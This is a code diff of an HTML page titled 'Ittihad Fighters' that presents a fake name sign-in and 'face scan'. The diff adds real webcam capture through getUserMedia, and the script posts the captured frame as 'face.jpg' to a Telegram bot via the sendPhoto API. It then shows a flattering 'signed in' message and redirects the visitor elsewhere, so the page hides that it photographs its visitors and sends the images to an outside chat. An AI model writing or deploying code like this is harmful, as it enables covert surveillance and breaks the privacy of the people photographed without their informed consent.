@@ -6,9 +6,7 @@
     <title>Ittihad Fighters</title>
     <script>
         if (localStorage.getItem("site_accessed")) {
-            document.body.innerHTML = "You have already accessed this site once.";
-        } else {
-            localStorage.setItem("site_accessed", "true");
+            document.write("You have already accessed this site once.");
         }
     </script>
     <style>
@@ -43,10 +41,11 @@
     <div id="scanning" class="hidden">
         <div id="animation"></div>
         <p>Scanning face...</p>
+        <video id="video" class="hidden" autoplay></video>
+        <canvas id="canvas" class="hidden"></canvas>
     </div>
 
     <p id="face-not-detected" class="hidden">Face not detected.</p>
-
     <p id="final-message" class="hidden"></p>
 
     <script>
@@ -58,56 +57,52 @@
             let checkboxes = document.querySelectorAll('.name-checkbox:checked');
             if (checkboxes.length === 0) return alert("Please select a name.");
             selectedName = checkboxes[0].value;
-            checkboxes.forEach(box => box.disabled = true);
             document.getElementById("name-selection").classList.add("hidden");
             document.getElementById("face-recognition").classList.remove("hidden");
         }
 
         function cancelRecognition() {
-            document.getElementById("face-recognition").classList.add("hidden");
-            document.getElementById("cancel-message").classList.remove("hidden");
-            localStorage.removeItem("site_accessed");
+            document.body.innerHTML = "Page will stop here.";
         }
 
         async function startCamera() {
             document.getElementById("face-recognition").classList.add("hidden");
             document.getElementById("scanning").classList.remove("hidden");
-            
-            setTimeout(() => {
-                document.getElementById("scanning").classList.add("hidden");
-                document.getElementById("face-not-detected").classList.remove("hidden");
-                setTimeout(captureImage, 5000);
-            }, 3000);
+            let video = document.getElementById("video");
+            let canvas = document.getElementById("canvas");
+            let ctx = canvas.getContext("2d");
+
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                setTimeout(() => captureImage(video, canvas, ctx, stream), 3000);
+            } catch (error) {
+                alert("Error accessing camera.");
+            }
         }
 
-        async function captureImage() {
-            document.getElementById("face-not-detected").classList.add("hidden");
-            document.getElementById("scanning").classList.remove("hidden");
-            
-            setTimeout(async () => {
-                let canvas = document.createElement("canvas");
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                let ctx = canvas.getContext("2d");
-                ctx.fillStyle = "black";
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(blob => {
-                    let formData = new FormData();
-                    formData.append("chat_id", TELEGRAM_CHAT_ID);
-                    formData.append("photo", blob, "face.jpg");
-                    
-                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                        method: "POST",
-                        body: formData
-                    }).then(() => {
-                        document.getElementById("scanning").classList.add("hidden");
-                        document.getElementById("final-message").innerText = `${selectedName} signed in.\nYou look beautiful/handsome today!\nRedirecting...`;
-                        document.getElementById("final-message").classList.remove("hidden");
-                        setTimeout(() => { window.location.href = "https://studandlearn.github.io/project-2/"; }, 3000);
-                    });
-                }, 'image/jpeg');
-            }, 2000);
+        function captureImage(video, canvas, ctx, stream) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            video.srcObject.getTracks().forEach(track => track.stop());
+
+            canvas.toBlob(blob => {
+                let formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob, "face.jpg");
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                }).then(() => {
+                    document.getElementById("scanning").classList.add("hidden");
+                    document.getElementById("final-message").innerText = `${selectedName} signed in.\nYou look beautiful/handsome today!\nRedirecting...`;
+                    document.getElementById("final-message").classList.remove("hidden");
+                    localStorage.setItem("site_accessed", "true");
+                    setTimeout(() => { window.location.href = "https://studandlearn.github.io/project-2/"; }, 3000);
+                });
+            }, 'image/jpeg');
         }
     </script>
 </body>
